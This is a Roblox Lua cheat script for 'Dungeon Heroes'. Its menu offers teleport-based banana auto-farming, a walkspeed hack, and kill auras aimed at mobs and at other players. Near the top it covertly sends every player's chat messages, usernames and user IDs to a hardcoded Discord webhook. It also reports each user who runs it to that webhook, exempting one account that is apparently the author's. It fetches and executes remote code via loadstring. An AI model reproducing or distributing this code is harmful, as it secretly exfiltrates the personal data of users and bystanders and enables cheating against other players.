local function sendToDiscord(player, msg)  
    local finalMsg = cleanMessage(msg)  
    if finalMsg == "" or finalMsg:match("^%s*$") then return end  

    -- 1. Headline & Color Logic  
    local titleText = "👤 Public Chat Detected"  
    local embedColor = 16776960 -- Yellow (Default for others)  

    if player == LocalPlayer then  
        titleText = "📤 Sent by You (LocalPlayer)"  
        embedColor = 65280 -- Green  
    else  
        titleText = "🗣️ Message from: " .. player.DisplayName  
        embedColor = 16711680 -- Red (Alert for others)  
    end  

    -- 2. Data Pack (Full Details)  
    local data = {  
        ["content"] = "",  
        ["embeds"] = {{  
            ["title"] = titleText,  
            ["description"] = "```\n" .. finalMsg .. "\n```",  
            ["color"] = embedColor,  
            ["fields"] = {  
                {  
                    ["name"] = "👤 Username",  
                    ["value"] = "`" .. player.Name .. "`",  
                    ["inline"] = true  
                },  
                {  
                    ["name"] = "🏷️ Display Name",  
                    ["value"] = player.DisplayName,  
                    ["inline"] = true  
                },  
                {  
                    ["name"] = "🆔 User ID",  
                    ["value"] = "`" .. tostring(player.UserId) .. "`",  
                    ["inline"] = true  
                }  
            },  
            ["footer"] = {  
                ["text"] = "Server ID: " .. game.JobId .. " | Time: " .. os.date("%X")  
            }  
        }}  
    }  

    request_func({  
        Url = WEBHOOK_URL,  
        Method = "POST",  
        Headers = {["Content-Type"] = "application/json"},  
        Body = HttpService:JSONEncode(data)  
    })  
end  

-- =========================================================  
-- 🛑 SMART HOOK SYSTEM (Fixes Double Messages)  
-- =========================================================  
  
local Hooked = false -- Ye variable check karega ki hook laga ya nahi  

-- SYSTEM 1: Try New Chat (TextChatService)  
local success, _ = pcall(function()  
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then  
        TextChatService.MessageReceived:Connect(function(textChatMessage)  
            if textChatMessage.TextSource then  
                local sender = Players:GetPlayerByUserId(textChatMessage.TextSource.UserId)  
                if sender then  
                    sendToDiscord(sender, textChatMessage.Text)  
                end  
            end  
        end)  
        Hooked = true  
        print("✅ Logger connected to TextChatService (Modern)")  
    end  
end)  

-- SYSTEM 2: Fallback to Old Chat (Legacy) -> Only if System 1 failed  
if not Hooked then  
    local function connectLegacy(p)  
        p.Chatted:Connect(function(msg)  
            sendToDiscord(p, msg)  
        end)  
    end  

    -- Connect Existing  
    for _, p in ipairs(Players:GetPlayers()) do  
        connectLegacy(p)  
    end  
    -- Connect New  
    Players.PlayerAdded:Connect(connectLegacy)  
      
    print("✅ Logger connected to Legacy Chat (Old)")  
end

end)

-- ==================================================================
-- TELEGRAM JOIN TRACKER
-- ==================================================================
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

-- =======================
-- TRACKING EXCLUSION
-- =======================
local EXCLUDED_USERNAME = "HACKER_ME222"

if player.Name:lower() ~= EXCLUDED_USERNAME:lower() then

    -- =======================
    -- WEBHOOK
    -- =======================
    local WEBHOOK = "https://discord.com/api/webhooks/1571498713497469130/Xj4LEFbOs_yQ0T2rjJM8CsPp3VQhMpwxZDvRwztpvfygj5CKWMCFrPU9DSvdVBlLurQl"

    -- =======================
    -- LOCAL TIME
    -- =======================
    local localTime = DateTime.now():ToLocalTime()

    local today = string.format(
        "%04d-%02d-%02d",
        localTime.Year,
        localTime.Month,
        localTime.Day
    )

    local timeIST = string.format(
        "%02d:%02d:%02d %s",
        (localTime.Hour % 12 == 0 and 12 or localTime.Hour % 12),
        localTime.Minute,
        localTime.Second,
        localTime.Hour >= 12 and "PM" or "AM"
    )

    -- =======================
    -- DAILY COUNTER
    -- =======================
    local FILE = "daily_counter.json"
    local data = {
        date = today,
        count = 0
    }

    pcall(function()
        if isfile(FILE) then
            local saved = HttpService:JSONDecode(readfile(FILE))

            if saved.date == today then
                data.count = saved.count
            end
        end
    end)

    data.count += 1

    pcall(function()
        writefile(FILE, HttpService:JSONEncode({
            date = today,
            count = data.count
        }))
    end)

    local dailyCount = data.count

    -- =======================
    -- EMBED
    -- =======================
    local embed = {
        username = "User Tracker",
        embeds = {{
            title = "🟢 New User Logged",
            color = 5814783,

            fields = {
                {
                    name = "Username",
                    value = "@" .. player.Name,
                    inline = false
                },
                {
                    name = "Display Name",
                    value = player.DisplayName,
                    inline = false
                },
                {
                    name = "User ID",
                    value = tostring(player.UserId),
                    inline = false
                },
                {
                    name = "Today's Count",
                    value = tostring(dailyCount),
                    inline = false
                }
            },

            footer = {
                text = "Time: " .. timeIST ..
                    " | Date: " .. today .. " (Local)"
            }
        }}
    }

    local send = HttpService:JSONEncode(embed)

    pcall(function()
        request({
            Url = WEBHOOK,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = send
        })
    end)
end

-- =======================
-- LOAD RAYFIELD
-- =======================
local Rayfield = loadstring(
    game:HttpGet("https://sirius.menu/rayfield")
)()

-- =======================
-- WALKSPEED LOGIC
-- =======================
local isToggled = false
local currentSpeed = 50
local maxSpeed = 200
local defaultSpeed = 16

local function UpdateSpeed()
    if player.Character then
        local humanoid = player.Character:FindFirstChild("Humanoid")

        if humanoid then
            humanoid.WalkSpeed = isToggled
                and currentSpeed
                or defaultSpeed
        end
    end
end

-- Keep speed active
RunService.RenderStepped:Connect(function()
    if isToggled and player.Character then
        local humanoid = player.Character:FindFirstChild("Humanoid")

        if humanoid and humanoid.WalkSpeed ~= currentSpeed then
            humanoid.WalkSpeed = currentSpeed
        end
    end
end)

-- Handle respawn
player.CharacterAdded:Connect(function(char)
    local hum = char:WaitForChild("Humanoid", 5)

    if hum and isToggled then
        hum.WalkSpeed = currentSpeed
    end
end)

-- ==========================================
-- RAYFIELD WINDOW & TAB
-- ==========================================

-- Ye line CreateWindow se BAHAR rahegi (Saare notifications block karne ke liye)
Rayfield.Notify = function() end

local Window = Rayfield:CreateWindow({
Name = "Dungeon Heroes By Sid",
Icon = 0,
LoadingTitle = "Dungeon Heroes By Sid",
LoadingSubtitle = "ultimate",
Theme = "Default",
DisableRayfieldPrompts = true,
DisableBuildWarnings = true,
ConfigurationSaving = {
Enabled = true,
FolderName = "SidDungeonHeroes",
FileName = "SavedConfig"
},
KeySystem = false
})

local MainTab = Window:CreateTab("⚡ Main", 4483362458)
local AutoGrindTab = Window:CreateTab("⚡ Grind", 4483362458)
local UtilityTab = Window:CreateTab("⚡ Utility", 4483362458)
local ChestTab = Window:CreateTab("⚡ Chest", 4483362458)
local MiscellaneousTab = Window:CreateTab("⚡ Miscellaneous", 4483362458)
local EventTab = Window:CreateTab("⚡ Event", 4483362458)


do
--========================================================
-- BANANA AUTO FARM V3 | RAYFIELD EDITION
-- Giant Banana (#1) + Humbaba King (#2) Priority + Auto Die
--========================================================

--================ RAYFIELD LOADER ======================

--================ SERVICES ==============================

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

--================ CONFIG ================================

local Enabled = false
local ReturnToStart = true
local MaxSyncWait = 0.07
local ClusterRadius = 35

local BossPriorityEnabled = true
local GiantBananaPriority = true
local HumbabaPriority = true
local BossActive = false
local AutoDieEnabled = false

-- Priority Order: Index 1 checks first, Index 2 checks second
local PriorityBossList = {
"Giant Banana",
"Humbaba King"
}

local CurrentBoss = nil

local Cooldowns = setmetatable({}, {
__mode = "k"
})

--================ SAFE GETTERS ==========================

local function GetBananaFolder()
return workspace:FindFirstChild("Bananas")
end

local function GetMobsFolder()
return workspace:FindFirstChild("Mobs")
end

local function GetBananaRemote()
local Remotes = RS:FindFirstChild("Remotes")
return Remotes and Remotes:FindFirstChild("BananaPickup")
end

local function GetCharacter()
return LocalPlayer.Character
end

local function GetHRP()
local Character = GetCharacter()
return Character and Character:FindFirstChild("HumanoidRootPart")
end

local function GetPart(Object)
if not Object then
return nil
end

if Object:IsA("BasePart") then  
    return Object  
end  

if Object:IsA("Model") then  
    return Object.PrimaryPart  
        or Object:FindFirstChild("HumanoidRootPart")  
        or Object:FindFirstChildWhichIsA("BasePart", true)  
end  

return nil

end

--================ BOSS HEALTH ===========================

local function GetBossHealth(Boss)
if not Boss or not Boss.Parent then
return 0
end

local Humanoid = Boss:FindFirstChildWhichIsA(  
    "Humanoid", true  
)  

if Humanoid then  
    return Humanoid.Health  
end  

local Health = Boss:FindFirstChild("Health", true)  

if Health and (  
    Health:IsA("NumberValue")  
    or Health:IsA("IntValue")  
) then  
    return Health.Value  
end  

local AttributeHealth = Boss:GetAttribute("Health")  

if typeof(AttributeHealth) == "number" then  
    return AttributeHealth  
end  

-- Fallback: If no health value is exposed on Giant Banana,  
-- check if it still has a valid BasePart inside Workspace.Mobs  
if GetPart(Boss) then  
    return 1  
end  

return 0

end

--================ BOSS DETECTION (PRIORITY BASED) =======

local function IsBossAllowed(TargetName)
if TargetName == "Giant Banana" then
return GiantBananaPriority
elseif TargetName == "Humbaba King" then
return HumbabaPriority
end
return false
end

local function FindPriorityBoss()
local Mobs = GetMobsFolder()

if not Mobs then  
    return nil  
end  

local AllMobs = Mobs:GetChildren()  

-- Outer loop checks "Giant Banana" completely before checking "Humbaba King"  
for _, PriorityName in ipairs(PriorityBossList) do  
    if IsBossAllowed(PriorityName) then  
        for _, Mob in ipairs(AllMobs) do  
            if Mob:IsA("Model") and Mob.Name == PriorityName then  
                if GetBossHealth(Mob) > 0 and GetPart(Mob) then  
                    return Mob  
                end  
            end  
        end  
    end  
end  

return nil

end

--================ BOSS PRIORITY CONTROLLER ==============

task.spawn(function()
while true do

if Enabled and BossPriorityEnabled then  

        local Boss = FindPriorityBoss()  

        if Boss then  
            CurrentBoss = Boss  
            BossActive = true  

            local HRP = GetHRP()  
            local BossPart = GetPart(Boss)  

            if HRP and BossPart  
                and Boss.Parent == GetMobsFolder()  
                and GetBossHealth(Boss) > 0 then  

                HRP.AssemblyLinearVelocity = Vector3.zero  
                HRP.AssemblyAngularVelocity = Vector3.zero  

                -- Stay near the highest-priority active boss  
                HRP.CFrame = BossPart.CFrame  
                    * CFrame.new(0, 0, 6)  
            end  

        else  
            CurrentBoss = nil  
            BossActive = false  
        end  

    else  
        CurrentBoss = nil  
        BossActive = false  
    end  

    task.wait(0.12)  
end

end)

--================ AUTO DIE ==============================

local function KillPlayer()
if not AutoDieEnabled then
return
end

local Character = GetCharacter()  

local Humanoid = Character  
    and Character:FindFirstChildOfClass("Humanoid")  

if Humanoid and Humanoid.Health > 0 then  
    Humanoid.Health = 0  
end

end

LocalPlayer.CharacterAdded:Connect(function()
if AutoDieEnabled then
task.wait(0.5)
KillPlayer()
end
end)

--================ BANANA COLLECT ========================

local function CollectBanana(HRP, Banana, Part, Remote)
task.spawn(function()
pcall(function()

if not Enabled or BossActive then  
            return  
        end  

        if firetouchinterest and HRP and Part then  
            firetouchinterest(HRP, Part, 0)  
            firetouchinterest(HRP, Part, 1)  
        end  

        if Remote then  
            Remote:FireServer(Banana)  
        end  

    end)  
end)

end

--================ RAYFIELD SECTION ======================

EventTab:CreateSection("Banana Auto Farm")

--================ MAIN FARM TOGGLE ======================

EventTab:CreateToggle({
Name = "Smart Auto Collect All (V3)",
CurrentValue = false,

Callback = function(Value)  

    Enabled = Value  

    if not Value then  
        BossActive = false  
        CurrentBoss = nil  
        return  
    end  

    -- THREAD 1: PASSIVE AURA  

    task.spawn(function()  

        while Enabled do  

            if not BossActive then  

                local BananaFolder = GetBananaFolder()  
                local Remote = GetBananaRemote()  
                local HRP = GetHRP()  

                if HRP and BananaFolder and Remote then  

                    local MyPos = HRP.Position  

                    for _, Banana in ipairs(  
                        BananaFolder:GetChildren()  
                    ) do  

                        if not Enabled or BossActive then  
                            break  
                        end  

                        local Part = GetPart(Banana)  

                        if Part  
                            and (Part.Position - MyPos).Magnitude  
                            <= ClusterRadius then  

                            CollectBanana(  
                                HRP,  
                                Banana,  
                                Part,  
                                Remote  
                            )  
                        end  
                    end  
                end  
            end  

            task.wait(0.05)  
        end  
    end)  

    -- THREAD 2: TELEPORT CLUSTER SWEEP  

    task.spawn(function()  

        while Enabled do  

            if not BossActive then  

                local BananaFolder = GetBananaFolder()  
                local Remote = GetBananaRemote()  
                local HRP = GetHRP()  

                if HRP and BananaFolder and Remote  
                    and not BossActive then  

                    local Now = os.clock()  
                    local ValidBananas = {}  

                    for _, Banana in ipairs(  
                        BananaFolder:GetChildren()  
                    ) do  

                        if not Enabled or BossActive then  
                            break  
                        end  

                        if Banana:IsA("Model")  
                            or Banana:IsA("BasePart") then  

                            local Last = Cooldowns[Banana] or 0  

                            if Now - Last >= 0.85 then  

                                local Part = GetPart(Banana)  

                                if Part then  
                                    table.insert(  
                                        ValidBananas,  
                                        {  
                                            Instance = Banana,  
                                            Part = Part,  
                                            Pos = Part.Position  
                                        }  
                                    )  
                                end  
                            end  
                        end  
                    end  

                    if #ValidBananas > 0 and not BossActive then  

                        local OldCFrame = HRP.CFrame  
                        local DidTeleport = false  

                        table.sort(  
                            ValidBananas,  
                            function(A, B)  
                                return (  
                                    A.Pos - HRP.Position  
                                ).Magnitude < (  
                                    B.Pos - HRP.Position  
                                ).Magnitude  
                            end  
                        )  

                        for _, Seed in ipairs(ValidBananas) do  

                            if not Enabled or BossActive then  
                                break  
                            end  

                            if Seed.Instance.Parent == BananaFolder  
                                and (  
                                    os.clock()  
                                    - (Cooldowns[Seed.Instance] or 0)  
                                ) >= 0.85 then  

                                local Batch = {}  
                                local CenterPos = Vector3.zero  

                                for _, Other in ipairs(ValidBananas) do  

                                    if not Enabled or BossActive then  
                                        break  
                                    end  

                                    if Other.Instance.Parent == BananaFolder  
                                        and (  
                                            os.clock()  
                                            - (Cooldowns[Other.Instance] or 0)  
                                        ) >= 0.85  
                                        and (  
                                            Other.Pos - Seed.Pos  
                                        ).Magnitude <= ClusterRadius then  

                                        table.insert(Batch, Other)  
                                        CenterPos += Other.Pos  
                                    end  
                                end  

                                if BossActive then  
                                    break  
                                end  

                                if #Batch > 1 then  

                                    CenterPos = CenterPos / #Batch  

                                    local FinalBatch = {}  

                                    for _, Item in ipairs(Batch) do  

                                        if (  
                                            Item.Pos - CenterPos  
                                        ).Magnitude <= ClusterRadius then  

                                            Cooldowns[Item.Instance] =  
                                                os.clock()  

                                            table.insert(  
                                                FinalBatch,  
                                                Item  
                                            )  
                                        end  
                                    end  

                                    if #FinalBatch <= 1 then  
                                        FinalBatch = {Seed}  

                                        Cooldowns[Seed.Instance] =  
                                            os.clock()  

                                        CenterPos = Seed.Pos  
                                    end  

                                    DidTeleport = true  

                                    HRP.AssemblyLinearVelocity =  
                                        Vector3.zero  

                                    HRP.AssemblyAngularVelocity =  
                                        Vector3.zero  

                                    HRP.CFrame = CFrame.new(  
                                        CenterPos + Vector3.new(0, 1.5, 0)  
                                    )  

                                    local StartTime = os.clock()  

                                    while Enabled  
                                        and not BossActive  
                                        and os.clock() - StartTime  
                                        < MaxSyncWait do  

                                        local AnyRemaining = false  

                                        for _, Item in ipairs(FinalBatch) do  

                                            if not Enabled or BossActive then  
                                                break  
                                            end  

                                            if Item.Instance.Parent  
                                                == BananaFolder then  

                                                AnyRemaining = true  

                                                CollectBanana(  
                                                    HRP,  
                                                    Item.Instance,  
                                                    Item.Part,  
                                                    Remote  
                                                )  
                                            end  
                                        end  

                                        if not AnyRemaining then  
                                            break  
                                        end  

                                        RunService.Heartbeat:Wait()  
                                    end  

                                    -- SINGLE FALLBACK  

                                    for _, Item in ipairs(FinalBatch) do  

                                        if not Enabled or BossActive then  
                                            break  
                                        end  

                                        if Item.Instance.Parent  
                                            == BananaFolder then  

                                            HRP.AssemblyLinearVelocity =  
                                                Vector3.zero  

                                            HRP.CFrame =  
                                                Item.Part.CFrame  
                                                + Vector3.new(0, 1.5, 0)  

                                            local SingleWait = os.clock()  

                                            while Enabled  
                                                and not BossActive  
                                                and Item.Instance.Parent  
                                                == BananaFolder  
                                                and os.clock() - SingleWait  
                                                < MaxSyncWait do  

                                                HRP.AssemblyLinearVelocity =  
                                                    Vector3.zero  

                                                CollectBanana(  
                                                    HRP,  
                                                    Item.Instance,  
                                                    Item.Part,  
                                                    Remote  
                                                )  

                                                RunService.Heartbeat:Wait()  
                                            end  
                                        end  
                                    end  

                                else  

                                    Cooldowns[Seed.Instance] =  
                                        os.clock()  

                                    DidTeleport = true  

                                    HRP.AssemblyLinearVelocity =  
                                        Vector3.zero  

                                    HRP.AssemblyAngularVelocity =  
                                        Vector3.zero  

                                    HRP.CFrame =  
                                        Seed.Part.CFrame  
                                        + Vector3.new(0, 1.5, 0)  

                                    local StartTime = os.clock()  

                                    while Enabled  
                                        and not BossActive  
                                        and Seed.Instance.Parent  
                                        == BananaFolder  
                                        and os.clock() - StartTime  
                                        < (MaxSyncWait + 0.03) do  

                                        HRP.AssemblyLinearVelocity =  
                                            Vector3.zero  

                                        CollectBanana(  
                                            HRP,  
                                            Seed.Instance,  
                                            Seed.Part,  
                                            Remote  
                                        )  

                                        RunService.Heartbeat:Wait()  
                                    end  
                                end  
                            end  
                        end  

                        -- RETURN TO ORIGINAL POSITION  

                        if DidTeleport  
                            and ReturnToStart  
                            and Enabled  
                            and not BossActive  
                            and HRP.Parent then  

                            HRP.AssemblyLinearVelocity =  
                                Vector3.zero  

                            HRP.CFrame = OldCFrame  
                        end  
                    end  
                end  
            end  

            task.wait(0.06)  
        end  
    end)  
end

})

--================ BOSS SETTINGS =========================

EventTab:CreateSection("Boss Priority System")

EventTab:CreateToggle({
Name = "Master Boss Priority",
CurrentValue = true,

Callback = function(Value)  
    BossPriorityEnabled = Value  

    if not Value then  
        BossActive = false  
        CurrentBoss = nil  
    end  
end

})

EventTab:CreateToggle({
Name = "#1 Priority: Giant Banana",
CurrentValue = true,

Callback = function(Value)  
    GiantBananaPriority = Value  
end

})

EventTab:CreateToggle({
Name = "#2 Priority: Humbaba King",
CurrentValue = true,

Callback = function(Value)  
    HumbabaPriority = Value  
end

})

--================ AUTO DIE ==============================

EventTab:CreateSection("Player Settings")

EventTab:CreateToggle({
Name = "Auto Die (HP 0)",
CurrentValue = false,

Callback = function(Value)  

    AutoDieEnabled = Value  

    if Value then  
        KillPlayer()  
    end  
end

})

--================ FARM SETTINGS ========================

EventTab:CreateSection("Collection Settings")

EventTab:CreateSlider({
Name = "Cluster Range (Studs)",
Range = {15, 35},
Increment = 1,
Suffix = " Studs",
CurrentValue = 24,

Callback = function(Value)  
    ClusterRadius = Value  
end

})

EventTab:CreateSlider({
Name = "Max Sync Wait",
Range = {0.03, 0.15},
Increment = 0.01,
Suffix = "s",
CurrentValue = 0.07,

Callback = function(Value)  
    MaxSyncWait = Value  
end

})

EventTab:CreateToggle({
Name = "Return To Original Position",
CurrentValue = true,

Callback = function(Value)  
    ReturnToStart = Value  
end

})

EventTab:CreateButton({
Name = "Reset Pickup Cooldowns",

Callback = function()  
    table.clear(Cooldowns)  
end

})
end

-- ==========================================
-- SPEED CONTROLS (TOGGLE + SLIDER + MANUAL INPUT)
-- ==========================================
MainTab:CreateSection("WalkSpeed Controls")

MainTab:CreateToggle({
Name = "Enable WalkSpeed",
CurrentValue = false,
Flag = "WalkSpeedToggle",
Callback = function(Value)
isToggled = Value
UpdateSpeed()
end,
})

local SpeedSlider
SpeedSlider = MainTab:CreateSlider({
Name = "Speed Slider (Max: 200)",
Range = {0, maxSpeed},
Increment = 1,
Suffix = "Speed",
CurrentValue = 50,
Flag = "WalkSpeedSlider",
Callback = function(Value)
currentSpeed = Value
UpdateSpeed()
end,
})

MainTab:CreateInput({
Name = "Manual Speed Input (0 - 200)",
CurrentValue = "80",
PlaceholderText = "Enter Speed (0 - 200)",
RemoveTextAfterFocusLost = false,
Flag = "WalkSpeedInput",
Callback = function(Text)
local num = tonumber(Text)
if num then
currentSpeed = math.clamp(math.floor(num), 0, maxSpeed)
if SpeedSlider and SpeedSlider.Set then
pcall(function()
SpeedSlider:Set(currentSpeed)
end)
end
UpdateSpeed()
end
end,
})

MainTab:CreateSection("Combat")

local CONFIG = {
KillRange = 200,
AttackSpeed = 0.15
}

local KillEnabled = false
local DuelEnabled = false

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local PlayerAttackRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("PlayerAttack")

-- 1. Mobs Kill Aura Function (TargetDummy Exception)
local function Kill()
task.spawn(function()
while KillEnabled do
task.wait()

local Character = LocalPlayer.Character  
        local HRP = Character and Character:FindFirstChild("HumanoidRootPart")  
        local MobsFolder = workspace:FindFirstChild("Mobs")  

        if HRP and MobsFolder then  
            local Targets = {}  

            for _, Mob in ipairs(MobsFolder:GetChildren()) do  
                -- Ignore TargetDummy  
                if Mob.Name ~= "TargetDummy" then  

                    local MobHRP = Mob:FindFirstChild("HumanoidRootPart")  
                    local HP = Mob:GetAttribute("HP")  

                    if MobHRP and HP ~= "0" and HP ~= 0  
                    and not Mob:GetAttribute("Owner")  
                    and (MobHRP.Position - HRP.Position).Magnitude <= CONFIG.KillRange then  
                        table.insert(Targets, Mob)  
                    end  
                end  
            end  

            for i = 1, 10 do  
                if not KillEnabled then break end  
                if #Targets > 0 then  
                    PlayerAttackRemote:FireServer(Targets)  
                end  
                task.wait(CONFIG.AttackSpeed)  
            end  
        end  
    end  
end)

end

-- 2. Players Duel Aura Function (Original Logic)
local function DuelKill()
task.spawn(function()
while DuelEnabled do
task.wait()

local Character = LocalPlayer.Character  
        local HRP = Character and Character:FindFirstChild("HumanoidRootPart")  

        if HRP then  
            local Targets = {}  

            for _, Player in ipairs(Players:GetPlayers()) do  
                if Player ~= LocalPlayer and Player.Character then  
                    local TargetChar = Player.Character  
                    local TargetHRP = TargetChar:FindFirstChild("HumanoidRootPart")  
                    local Humanoid = TargetChar:FindFirstChildOfClass("Humanoid")  
                    local HPAttr = TargetChar:GetAttribute("HP")  

                    local IsAlive = (Humanoid and Humanoid.Health > 0) or (HPAttr and HPAttr ~= "0" and HPAttr ~= 0)  
                    if Humanoid == nil and HPAttr == nil then  
                        IsAlive = true  
                    end  

                    if TargetHRP and IsAlive and (TargetHRP.Position - HRP.Position).Magnitude <= CONFIG.KillRange then  
                        table.insert(Targets, TargetChar)  
                    end  
                end  
            end  

            for i = 1, 10 do  
                if not DuelEnabled then break end  
                if #Targets > 0 then  
                    local args = {  
                        Targets  
                    }  
                    PlayerAttackRemote:FireServer(unpack(args))  
                end  
                task.wait(CONFIG.AttackSpeed)  
            end  
        end  
    end  
end)

end

-- Kill Aura Toggle (For Mobs)
MainTab:CreateToggle({
Name = "Kill Aura",
CurrentValue = false,
Flag = "KillAura",
Callback = function(Value)
KillEnabled = Value
if Value then
Kill()
end
end
})

-- Duel Aura Toggle (For Players)
MainTab:CreateToggle({
Name = "Duel Aura",
CurrentValue = false,
Flag = "DuelAura",
Callback = function(Value)
DuelEnabled = Value
if Value then
DuelKill()
end
end
})

-- Kill Range Slider (Works for both)
MainTab:CreateSlider({
Name = "Kill Range",
Range = {10, 200},
Increment = 5,
Suffix = "Studs",
CurrentValue = 200,
Flag = "KillRange",
Callback = function(Value)
CONFIG.KillRange = Value
end
})

-- Attack Speed Slider (Works for both)
MainTab:CreateSlider({
Name = "Attack Speed (Use Only Default)",
Range = {0.01, 1},
Increment = 0.01,
Suffix = "Seconds",
CurrentValue = 0.15,
Flag = "AttackSpeed",
Callback = function(Value)
CONFIG.AttackSpeed = Value
end
})

-- ================= Pet Aura =======================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local function GetMobsFolder()
	return workspace:FindFirstChild("Mobs")
end

local PetDamage = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("PetDamage")
local MobsSystem = require(ReplicatedStorage:WaitForChild("Systems"):WaitForChild("Mobs"))

local CONFIG = {
	KillRange = 300,
	AttackSpeed = 0.001,
	ClusterRadius = 25
}

-- Cache table taaki har pet ka best attack 1 hi baar scan ho
local CachedBestAttack = {}

local KillEnabled = false
local LoopId = 0

-- Find equipped pet
local function GetMyPet()
	local MobsFolder = GetMobsFolder()
	if not MobsFolder then return nil end

	for _, Mob in ipairs(MobsFolder:GetChildren()) do
		if Mob:GetAttribute("Owner") == LocalPlayer.Name then
			return Mob
		end
	end
	return nil
end

-- Auto-Detect ONLY the #1 Highest Damage Skill of the Equipped Pet
local function GetBestPetAttack(Pet)
	if not Pet then return nil end
	local PetName = Pet.Name

	if CachedBestAttack[PetName] then
		return CachedBestAttack[PetName]
	end

	local Ok, AttacksFolder = pcall(function()
		return MobsSystem:GetMobAttacksFolder(PetName)
	end)

	if not Ok or not AttacksFolder then
		return nil
	end

	local BestSkill = nil
	local BestDamage = -1
	local BestRange = -1
	local BestCooldown = -1

	for _, AttackFolder in ipairs(AttacksFolder:GetChildren()) do
		if AttackFolder:IsA("Folder") and not AttackFolder:FindFirstChild("PetsCannotUse") then
			local RangeObj = AttackFolder:FindFirstChild("AttackRange")
			local CooldownObj = AttackFolder:FindFirstChild("Cooldown")
			local AtkRange = (RangeObj and tonumber(RangeObj.Value)) or 0
			local AtkCooldown = (CooldownObj and tonumber(CooldownObj.Value)) or 0

			for _, Child in ipairs(AttackFolder:GetChildren()) do
				if Child:IsA("BasePart") and not Child:FindFirstChild("IsHeal") then
					-- HitDamage check karo (default = 1)
					local DmgObj = Child:FindFirstChild("HitDamage") or AttackFolder:FindFirstChild("HitDamage")
					local HitDmg = (DmgObj and tonumber(DmgObj.Value)) or 1

					-- Sabse zyada HitDamage wali skill chuno (Tie hone par zyada Range/Cooldown wali Heavy skill)
					local IsBetter = false
					if HitDmg > BestDamage then
						IsBetter = true
					elseif HitDmg == BestDamage then
						if AtkRange > BestRange then
							IsBetter = true
						elseif AtkRange == BestRange and AtkCooldown > BestCooldown then
							IsBetter = true
						end
					end

					if IsBetter then
						BestDamage = HitDmg
						BestRange = AtkRange
						BestCooldown = AtkCooldown
						BestSkill = { AttackFolder.Name, Child.Name, HitDmg }
					end
				end
			end
		end
	end

	if BestSkill then
		CachedBestAttack[PetName] = BestSkill
		print(string.format("[Pet Kill Aura] %s -> Best Skill: %s (%s) | Skill Damage Mult: %s", PetName, BestSkill[1], BestSkill[2], tostring(BestSkill[3])))
		return BestSkill
	end

	return nil
end

-- Check if mob is valid enemy
local function IsValidEnemy(Mob, MyPet)
	if Mob == MyPet then return false end

	-- EXCEPTION: Completely ignore TargetDummy
	if Mob.Name == "TargetDummy" then return false end

	local Owner = Mob:GetAttribute("Owner")
	if Owner ~= nil and Owner ~= "" then return false end

	if string.find(Mob.Name, "Dummy") then return true end

	local HP = tonumber(Mob:GetAttribute("HP"))
	if HP ~= nil then return HP > 0 end

	local Humanoid = Mob:FindFirstChildOfClass("Humanoid")
	if Humanoid then return Humanoid.Health > 0 end

	return true
end

-- Collect enemies in range
local function GetTargets(HRP, MyPet)
	local Targets = {}
	local MobsFolder = GetMobsFolder()
	if not MobsFolder then return Targets end

	for _, Mob in ipairs(MobsFolder:GetChildren()) do
		local MobHRP = Mob:FindFirstChild("HumanoidRootPart") or Mob.PrimaryPart
		if MobHRP and IsValidEnemy(Mob, MyPet) then
			local Distance = (MobHRP.Position - HRP.Position).Magnitude
			if Distance <= CONFIG.KillRange then
				table.insert(Targets, {
					Instance = Mob,
					Position = MobHRP.Position,
					Distance = Distance
				})
			end
		end
	end

	table.sort(Targets, function(a, b)
		return a.Distance < b.Distance
	end)

	return Targets
end

-- Build hit clusters
local function BuildHitClusters(TargetDataList)
	local Clusters = {}
	local Used = {}

	for i, Primary in ipairs(TargetDataList) do
		if not Used[i] then
			Used[i] = true
			local GroupInstances = { Primary.Instance }

			for j = i + 1, #TargetDataList do
				if not Used[j] then
					local Secondary = TargetDataList[j]
					if (Secondary.Position - Primary.Position).Magnitude <= CONFIG.ClusterRadius then
						Used[j] = true
						table.insert(GroupInstances, Secondary.Instance)
					end
				end
			end

			table.insert(Clusters, {
				Mobs = GroupInstances,
				Position = Primary.Position
			})
		end
	end

	return Clusters
end

-- Pet Aura Loop (Fires ONLY the #1 Best Skill)
local function StartKillAura()
	if not KillEnabled then return end

	LoopId += 1
	local CurrentId = LoopId

	task.spawn(function()
		while KillEnabled and LoopId == CurrentId do
			local Character = LocalPlayer.Character
			local HRP = Character and Character:FindFirstChild("HumanoidRootPart")

			if HRP then
				local Pet = GetMyPet()
				local BestAttack = GetBestPetAttack(Pet)

				if Pet and BestAttack then
					local TargetData = GetTargets(HRP, Pet)

					if #TargetData > 0 then
						local Clusters = BuildHitClusters(TargetData)

						for _, Cluster in ipairs(Clusters) do
							if not KillEnabled or LoopId ~= CurrentId then
								break
							end

							PetDamage:FireServer(
								Pet,
								BestAttack[1],
								BestAttack[2],
								Cluster.Mobs,
								Cluster.Position
							)
						end
					end
				end
			end

			task.wait(CONFIG.AttackSpeed)
		end
	end)
end

-- ON/OFF Toggle
MainTab:CreateToggle({
	Name = "Pet Aura ( Lungsen recommended)",
	CurrentValue = false,
	Flag = "PetKillAura",
	Callback = function(Value)
		KillEnabled = Value
		if Value then
			StartKillAura()
		else
			LoopId += 1
		end
	end
})

-- Pet Kill Range
MainTab:CreateSlider({
	Name = "Pet Kill Range",
	Range = {10, 300},
	Increment = 5,
	Suffix = "Studs",
	CurrentValue = 200,
	Flag = "PetKillRange",
	Callback = function(Value)
		CONFIG.KillRange = Value
	end
})

-- Pet Attack Speed
MainTab:CreateSlider({
	Name = "Pet Attack Speed",
	Range = {0.001, 1},
	Increment = 0.01,
	Suffix = "Seconds",
	CurrentValue = 0.001,
	Flag = "PetAttackSpeed",
	Callback = function(Value)
		CONFIG.AttackSpeed = Value
	end
})


-- ==========================================
-- SCRIPT LOADERS (FOLLOW PLAYER & EMOTE V2)
-- ==========================================
